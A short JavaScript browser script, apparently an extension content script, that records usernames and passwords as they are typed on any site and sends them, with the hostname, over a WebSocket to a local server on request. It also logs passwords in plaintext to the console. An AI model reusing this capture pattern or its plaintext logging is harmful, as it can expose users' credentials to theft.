let recordedData = {
    name: '',
    password: ''
};

let typingTimer;
const SITE_URL = window.location.hostname; // Gets the domain of the current site
const ws = new WebSocket('ws://localhost:8765');

// WebSocket connection setup
ws.onopen = () => {
    console.log('WebSocket connection opened');
};

ws.onclose = () => {
    console.log('WebSocket connection closed');
};

ws.onerror = (error) => {
    console.error('WebSocket error:', error);
};

ws.onmessage = (event) => {
    const message = event.data;
    console.log('Received WebSocket message:', message);

    if (message === 'iwantsite') {
        sendSite();
    } else if (message === 'iwantusername') {
        sendUsername();
    } else if (message === 'iwantpassword') {
        sendPassword();
    }
};

function sendToServer(data) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(data);
    } else {
        console.error('WebSocket is not open. Cannot send data.');
    }
}

function sendSite() {
    const site = SITE_URL;
    console.log('Sending site:', site);
    sendToServer(site);
}

function sendUsername() {
    const username = recordedData.name;
    console.log('Sending username:', username);
    sendToServer(username);
}

function sendPassword() {
    const password = recordedData.password;
    console.log('Sending password:', password);
    sendToServer(password);
}

function updateData(fieldType, value) {
    recordedData[fieldType] = value;
    console.log(`Updated ${fieldType}:`, recordedData[fieldType]);
}

function finalizeData() {
    if (recordedData.name && recordedData.password) {
        console.log('Finalized Data:', recordedData);
        // Send "iwanttowrite" to the WebSocket
        sendToServer('iwanttowrite');
    } else {
        console.log('Both fields are not filled yet');
    }
}

function resetTypingTimer() {
    clearTimeout(typingTimer);
    // Set a timer to finalize data 5 seconds after user stops typing
    typingTimer = setTimeout(finalizeData, 5000);
}

// Event listener for input fields
document.addEventListener('input', (event) => {
    if (event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) {
        updateData('name', event.target.value);
    } else if (event.target.type === 'password') {
        updateData('password', event.target.value);
    }
    resetTypingTimer(); // Reset the timer on each input event
}, true);

// Event listener for blur event
document.addEventListener('blur', (event) => {
    if ((event.target.type === 'text' && event.target.name.toLowerCase().includes('name')) ||
        event.target.type === 'password') {
        resetTypingTimer(); // Ensure the timer is reset when user leaves the input field
    }
}, true);
